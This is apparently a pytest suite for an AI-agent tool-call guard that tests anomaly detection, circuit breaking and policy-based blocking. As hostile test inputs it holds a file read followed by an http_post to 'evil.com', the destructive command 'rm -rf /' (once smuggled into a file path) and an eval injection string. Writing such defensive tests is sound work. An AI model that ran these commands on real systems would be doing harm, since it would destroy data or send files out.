"""Tests for JadeGate v2 Runtime Layer."""

import time
import pytest

from jadegate.runtime.session import JadeSession
from jadegate.runtime.interceptor import ToolCallInterceptor, CallVerdict, InterceptResult
from jadegate.runtime.dynamic_dag import DynamicDAG, DAGNode, AnomalyType
from jadegate.runtime.circuit_breaker import CircuitBreaker, BreakerState
from jadegate.policy.policy import JadePolicy


class TestDynamicDAG:
    def test_add_call(self):
        dag = DynamicDAG()
        node = DAGNode(call_id="c1", tool_name="file_read", params_summary={"path": "/tmp/x"}, timestamp=time.time())
        anomalies = dag.add_call(node)
        assert dag.depth == 1
        assert "c1" in dag.nodes

    def test_sequential_edges(self):
        dag = DynamicDAG()
        dag.add_call(DAGNode(call_id="c1", tool_name="a", params_summary={}, timestamp=time.time()))
        dag.add_call(DAGNode(call_id="c2", tool_name="b", params_summary={}, timestamp=time.time()))
        assert len(dag.edges) == 1
        assert dag.edges[0].from_id == "c1"
        assert dag.edges[0].to_id == "c2"

    def test_depth_exceeded(self):
        dag = DynamicDAG(max_depth=3)
        for i in range(5):
            anomalies = dag.add_call(DAGNode(
                call_id=f"c{i}", tool_name="test", params_summary={}, timestamp=time.time()
            ))
        # Should have depth exceeded anomalies for calls 4 and 5
        depth_anomalies = [a for a in dag.anomalies if a.anomaly_type == AnomalyType.DEPTH_EXCEEDED]
        assert len(depth_anomalies) > 0

    def test_data_exfiltration_detection(self):
        dag = DynamicDAG()
        dag.add_call(DAGNode(call_id="c1", tool_name="file_read", params_summary={"path": "/etc/data"}, timestamp=time.time()))
        anomalies = dag.add_call(DAGNode(call_id="c2", tool_name="http_post", params_summary={"url": "http://evil.com"}, timestamp=time.time()))
        exfil = [a for a in anomalies if a.anomaly_type == AnomalyType.DATA_EXFILTRATION]
        assert len(exfil) > 0

    def test_circular_call_detection(self):
        dag = DynamicDAG()
        dag.add_call(DAGNode(call_id="c1", tool_name="tool_a", params_summary={}, timestamp=time.time()))
        dag.add_call(DAGNode(call_id="c2", tool_name="tool_b", params_summary={}, timestamp=time.time()))
        anomalies = dag.add_call(DAGNode(call_id="c3", tool_name="tool_a", params_summary={}, timestamp=time.time()))
        circular = [a for a in anomalies if a.anomaly_type == AnomalyType.CIRCULAR_CALL]
        assert len(circular) > 0

    def test_to_dict(self):
        dag = DynamicDAG()
        dag.add_call(DAGNode(call_id="c1", tool_name="test", params_summary={}, timestamp=1000.0))
        d = dag.to_dict()
        assert "nodes" in d
        assert "edges" in d
        assert "anomalies" in d
        assert d["depth"] == 1

    def test_reset(self):
        dag = DynamicDAG()
        dag.add_call(DAGNode(call_id="c1", tool_name="test", params_summary={}, timestamp=time.time()))
        dag.reset()
        assert dag.depth == 0
        assert len(dag.nodes) == 0


class TestCircuitBreaker:
    def test_initial_state(self):
        cb = CircuitBreaker(threshold=3)
        assert cb.can_call("tool_a") is True

    def test_trip_after_threshold(self):
        cb = CircuitBreaker(threshold=3, timeout_sec=60)
        cb.record_failure("tool_a")
        cb.record_failure("tool_a")
        tripped = cb.record_failure("tool_a")
        assert tripped is True
        assert cb.can_call("tool_a") is False

    def test_success_resets_count(self):
        cb = CircuitBreaker(threshold=3)
        cb.record_failure("tool_a")
        cb.record_failure("tool_a")
        cb.record_success("tool_a")
        # Should be reset, need 3 more failures
        cb.record_failure("tool_a")
        cb.record_failure("tool_a")
        assert cb.can_call("tool_a") is True  # only 2 failures

    def test_half_open_recovery(self):
        cb = CircuitBreaker(threshold=2, timeout_sec=0.1)
        cb.record_failure("tool_a")
        cb.record_failure("tool_a")
        assert cb.can_call("tool_a") is False
        time.sleep(0.15)
        assert cb.can_call("tool_a") is True  # half-open
        cb.record_success("tool_a")
        assert cb.can_call("tool_a") is True  # closed again

    def test_half_open_failure(self):
        cb = CircuitBreaker(threshold=2, timeout_sec=0.1)
        cb.record_failure("tool_a")
        cb.record_failure("tool_a")
        time.sleep(0.15)
        cb.can_call("tool_a")  # transition to half-open
        cb.record_failure("tool_a")  # probe fails
        assert cb.can_call("tool_a") is False  # back to open

    def test_reset(self):
        cb = CircuitBreaker(threshold=2)
        cb.record_failure("tool_a")
        cb.record_failure("tool_a")
        cb.reset("tool_a")
        assert cb.can_call("tool_a") is True

    def test_get_status(self):
        cb = CircuitBreaker(threshold=3)
        cb.record_failure("tool_a")
        status = cb.get_status()
        assert "tool_a" in status
        assert status["tool_a"]["failure_count"] == 1


class TestInterceptor:
    def setup_method(self):
        self.policy = JadePolicy.default()
        self.dag = DynamicDAG()
        self.breaker = CircuitBreaker()
        self.interceptor = ToolCallInterceptor(
            policy=self.policy, dag=self.dag, circuit_breaker=self.breaker
        )

    def test_allow_normal_call(self):
        result = self.interceptor.before_call("file_read", {"path": "/tmp/data.txt"})
        assert result.verdict == CallVerdict.ALLOW

    def test_block_blocked_action(self):
        result = self.interceptor.before_call("shell_exec", {"command": "ls"})
        assert result.verdict == CallVerdict.DENY
        assert any("blocked" in r.lower() for r in result.reasons)

    def test_need_approval(self):
        result = self.interceptor.before_call("email_send", {"to": "test@example.com"})
        assert result.verdict == CallVerdict.NEED_APPROVAL

    def test_block_dangerous_params(self):
        result = self.interceptor.before_call("file_read", {"path": "/tmp/test; rm -rf /"})
        assert result.verdict == CallVerdict.DENY

    def test_block_code_injection(self):
        result = self.interceptor.before_call("query", {"q": "eval(malicious_code)"})
        assert result.verdict == CallVerdict.DENY

    def test_after_call_updates_dag(self):
        result = self.interceptor.before_call("file_read", {"path": "/tmp/x"})
        self.interceptor.after_call(result.call_id, success=True)
        assert self.dag.depth == 1

    def test_circuit_breaker_blocks(self):
        # Trip the breaker
        for _ in range(5):
            r = self.interceptor.before_call("flaky_tool", {})
            self.interceptor.after_call(r.call_id, success=False)
        # Next call should be blocked
        result = self.interceptor.before_call("flaky_tool", {})
        assert result.verdict == CallVerdict.DENY
        assert any("circuit" in r.lower() for r in result.reasons)

    def test_audit_log(self):
        self.interceptor.before_call("test_tool", {"key": "value"})
        log = self.interceptor.audit_log
        assert len(log) >= 1
        assert log[0]["tool_name"] == "test_tool"


class TestJadeSession:
    def test_create_session(self):
        s = JadeSession()
        assert s.call_count == 0
        assert s.blocked_count == 0

    def test_before_call_allow(self):
        s = JadeSession()
        result = s.before_call("file_read", {"path": "/tmp/x"})
        assert result.allowed
        assert s.call_count == 1

    def test_before_call_deny(self):
        s = JadeSession()
        result = s.before_call("shell_exec", {"cmd": "rm -rf /"})
        assert not result.allowed
        assert s.blocked_count == 1

    def test_after_call(self):
        s = JadeSession()
        result = s.before_call("test", {})
        s.after_call(result.call_id, success=True)
        assert s.dag.depth == 1

    def test_close(self):
        s = JadeSession()
        s.before_call("test", {})
        status = s.close()
        assert status["total_calls"] == 1
        assert status["closed"] is True
        # After close, calls are denied
        result = s.before_call("test", {})
        assert not result.allowed

    def test_get_status(self):
        s = JadeSession()
        s.before_call("a", {})
        s.before_call("shell_exec", {"cmd": "x"})
        status = s.get_status()
        assert status["total_calls"] == 2
        assert status["blocked_calls"] == 1

    def test_custom_policy(self):
        policy = JadePolicy.strict()
        s = JadeSession(policy=policy)
        result = s.before_call("http_get", {"url": "http://example.com"})
        assert result.verdict == CallVerdict.NEED_APPROVAL

    def test_anomalies_tracked(self):
        s = JadeSession()
        s.before_call("file_read", {"path": "/data"})
        s.before_call("http_post", {"url": "http://evil.com"})
        assert len(s.anomalies) > 0
